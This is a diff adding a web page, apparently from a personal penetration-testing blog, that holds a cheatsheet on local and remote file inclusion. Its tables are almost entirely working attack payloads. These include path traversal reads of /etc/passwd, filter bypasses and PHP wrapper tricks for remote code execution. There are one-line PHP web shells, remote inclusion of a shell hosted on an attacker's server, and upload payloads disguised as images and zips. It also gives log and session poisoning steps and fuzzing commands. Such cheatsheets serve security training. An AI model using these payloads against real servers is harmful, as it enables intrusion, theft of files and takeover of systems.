@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-onxosb5w><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="l3benn" href="https://l3benn.github.io/rss.xml"><meta name="generator" content="Astro v7.0.7"><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/ae46a19c26154f8b.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/b61ca58d23e0a26b.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/ae46a19c26154f8b.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/b61ca58d23e0a26b.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://l3benn.github.io/cheatsheets/lfi-file-inclusion/"><!-- Primary Meta Tags --><title>LFI &amp; File Inclusion Cheatsheet - l3benn</title><meta name="description" content="Local File Inclusion, bypasses, RFI, log poisoning, and RCE techniques"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://l3benn.github.io/cheatsheets/lfi-file-inclusion/"><meta property="og:title" content="LFI &amp; File Inclusion Cheatsheet - l3benn"><meta property="og:description" content="Local File Inclusion, bypasses, RFI, log poisoning, and RCE techniques"><meta property="og:image" content="https://l3benn.github.io/_astro/blog-placeholder-1.Bx0Zcyzv.jpg"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><link rel="stylesheet" href="/_astro/Header.CQY_uYKX.css"><style>.prose[data-astro-cid-onxosb5w]{width:720px;max-width:calc(100% - 2em);color:rgb(var(--gray-dark));margin:auto;padding:1em}.title[data-astro-cid-onxosb5w]{text-align:center;margin-bottom:1.5em}.title[data-astro-cid-onxosb5w] h1[data-astro-cid-onxosb5w]{margin:0 0 .3em}.title[data-astro-cid-onxosb5w] .category[data-astro-cid-onxosb5w]{background:rgb(var(--gray-light));color:rgb(var(--gray-dark));border-radius:4px;padding:.2em .6em;font-size:.85em;display:inline-block}
+</style></head><body data-astro-cid-onxosb5w><header data-astro-cid-nen7h5rs><nav data-astro-cid-nen7h5rs><h2 data-astro-cid-nen7h5rs><a href="/" data-astro-cid-nen7h5rs>l3benn</a></h2><div class="internal-links" data-astro-cid-nen7h5rs><a href="/" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/writeups" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Writeups</a><a href="/cheatsheets" class="active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Cheatsheets</a><a href="/certs" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Certifications</a><a href="/about" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a><a href="/search" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Search</a></div><div class="social-links" data-astro-cid-nen7h5rs><a href="https://github.com/l3benn" target="_blank" title="GitHub" data-astro-cid-nen7h5rs><svg viewBox="0 0 16 16" aria-hidden="true" width="24" height="24" data-astro-cid-nen7h5rs><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-nen7h5rs></path></svg></a><a href="https://medium.com/@chiheb.mahfoudh_11384" target="_blank" title="Medium" data-astro-cid-nen7h5rs><svg viewBox="0 0 16 16" aria-hidden="true" width="24" height="24" data-astro-cid-nen7h5rs><path fill="currentColor" d="M9.025 8c0 2.485-2.02 4.5-4.513 4.5A4.506 4.506 0 0 1 0 8c0-2.486 2.02-4.5 4.512-4.5A4.506 4.506 0 0 1 9.025 8zm4.95 0c0 2.34-1.01 4.236-2.256 4.236S9.463 10.34 9.463 8s1.01-4.236 2.256-4.236S13.975 5.66 13.975 8zM16 8c0 2.096-.355 3.795-.794 3.795-.438 0-.793-1.7-.793-3.795 0-2.096.355-3.795.794-3.795.438 0 .793 1.699.793 3.795z" data-astro-cid-nen7h5rs></path></svg></a><a href="https://www.linkedin.com/in/chiheb-mahfoudh-285917339/" target="_blank" title="LinkedIn" data-astro-cid-nen7h5rs><svg viewBox="0 0 16 16" aria-hidden="true" width="24" height="24" data-astro-cid-nen7h5rs><path fill="currentColor" d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z" data-astro-cid-nen7h5rs></path></svg></a></div></nav></header><main data-astro-cid-onxosb5w><article data-astro-cid-onxosb5w><div class="prose" data-astro-cid-onxosb5w><div class="title" data-astro-cid-onxosb5w><span class="category" data-astro-cid-onxosb5w>Web</span><h1 data-astro-cid-onxosb5w>LFI &amp; File Inclusion Cheatsheet</h1></div><h2 id="basic-lfi">Basic LFI</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/index.php?language=/etc/passwd</code></td>
+<td>Basic LFI</td>
+</tr>
+<tr>
+<td><code>/index.php?language=../../../../etc/passwd</code></td>
+<td>LFI with path traversal</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/../../../etc/passwd</code></td>
+<td>LFI with name prefix</td>
+</tr>
+<tr>
+<td><code>/index.php?language=./languages/../../../../etc/passwd</code></td>
+<td>LFI with approved path</td>
+</tr>
+</tbody>
+</table>
+<h2 id="lfi-bypasses">LFI Bypasses</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/index.php?language=....//....//....//....//etc/passwd</code></td>
+<td>Bypass basic path traversal filter</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td>
+<td>Bypass filters with URL encoding</td>
+</tr>
+<tr>
+<td><code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td>
+<td>Bypass appended extension with path truncation (obsolete)</td>
+</tr>
+<tr>
+<td><code>/index.php?language=../../../../etc/passwd%00</code></td>
+<td>Bypass appended extension with null byte (obsolete)</td>
+</tr>
+<tr>
+<td><code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td>
+<td>Read PHP with base64 filter</td>
+</tr>
+</tbody>
+</table>
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP Wrappers</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td>
+<td>RCE with data wrapper</td>
+</tr>
+<tr>
+<td><code>curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id"</code></td>
+<td>RCE with input wrapper</td>
+</tr>
+<tr>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"</code></td>
+<td>RCE with expect wrapper</td>
+</tr>
+<tr>
+<td><strong>RFI</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td>
+<td>Host web shell</td>
+</tr>
+<tr>
+<td><code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td>
+<td>Include remote PHP web shell</td>
+</tr>
+<tr>
+<td><strong>LFI + Upload</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif</code></td>
+<td>Create malicious image</td>
+</tr>
+<tr>
+<td><code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded image</td>
+</tr>
+<tr>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></td>
+<td>Create malicious zip archive ‘as jpg’</td>
+</tr>
+<tr>
+<td><code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded zip</td>
+</tr>
+<tr>
+<td><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></td>
+<td>Create malicious phar ‘as jpg’</td>
+</tr>
+<tr>
+<td><code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded phar</td>
+</tr>
+<tr>
+<td><strong>Log Poisoning</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td>
+<td>Read PHP session parameters</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td>
+<td>Poison PHP session with web shell</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+<tr>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></td>
+<td>Poison server log</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+</tbody>
+</table>
+<h2 id="misc">Misc</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
+<td>Fuzz page parameters</td>
+</tr>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code></td>
+<td>Fuzz LFI payloads</td>
+</tr>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td>
+<td>Fuzz webroot path</td>
+</tr>
+<tr>
+<td><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code></td>
+<td>Fuzz server configurations</td>
+</tr>
+</tbody>
+</table>
+<h3 id="wordlists">Wordlists</h3>
+<ul>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlists</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Webroot path wordlist for Linux</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Webroot path wordlist for Windows</a></li>
+<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">Server configurations wordlist for Linux</a></li>
+<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">Server configurations wordlist for Windows</a></li>
+</ul>
+<h2 id="file-inclusion-functions">File Inclusion Functions</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th style="text-align: center">Read Content</th>
+<th style="text-align: center">Execute</th>
+<th style="text-align: center">Remote URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+</tr>
+<tr>
+<td><code>include()</code>/<code>include_once()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+</tr>
+<tr>
+<td><code>require()</code>/<code>require_once()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">Yes</td>
+</tr>
+<tr>
+<td><code>fopen()</code>/<code>file()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+</tr>
+<tr>
+<td><code>fs.readFile()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><code>fs.sendFile()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+<td style="text-align: center"></td>
+</tr>
+<tr>
+<td><code>@Html.Partial()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">Yes</td>
+</tr>
+<tr>
+<td><code>Response.WriteFile()</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">No</td>
+<td style="text-align: center">No</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+<td style="text-align: center">Yes</td>
+</tr>
+</tbody>
+</table>
+</div></article></main><footer data-astro-cid-jo6i4kqk>&copy; 2026 Chiheb Mahfoudh. All rights reserved.<div class="social-links" data-astro-cid-jo6i4kqk><a href="https://github.com/l3benn" target="_blank" title="GitHub" data-astro-cid-jo6i4kqk><svg viewBox="0 0 16 16" aria-hidden="true" width="24" height="24" data-astro-cid-jo6i4kqk><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-jo6i4kqk></path></svg></a><a href="https://medium.com/@chiheb.mahfoudh_11384" target="_blank" title="Medium" data-astro-cid-jo6i4kqk><svg viewBox="0 0 16 16" aria-hidden="true" width="24" height="24" data-astro-cid-jo6i4kqk><path fill="currentColor" d="M9.025 8c0 2.485-2.02 4.5-4.513 4.5A4.506 4.506 0 0 1 0 8c0-2.486 2.02-4.5 4.512-4.5A4.506 4.506 0 0 1 9.025 8zm4.95 0c0 2.34-1.01 4.236-2.256 4.236S9.463 10.34 9.463 8s1.01-4.236 2.256-4.236S13.975 5.66 13.975 8zM16 8c0 2.096-.355 3.795-.794 3.795-.438 0-.793-1.7-.793-3.795 0-2.096.355-3.795.794-3.795.438 0 .793 1.699.793 3.795z" data-astro-cid-jo6i4kqk></path></svg></a><a href="https://www.linkedin.com/in/chiheb-mahfoudh-285917339/" target="_blank" title="LinkedIn" data-astro-cid-jo6i4kqk><svg viewBox="0 0 16 16" aria-hidden="true" width="24" height="24" data-astro-cid-jo6i4kqk><path fill="currentColor" d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z" data-astro-cid-jo6i4kqk></path></svg></a></div></footer></body></html>
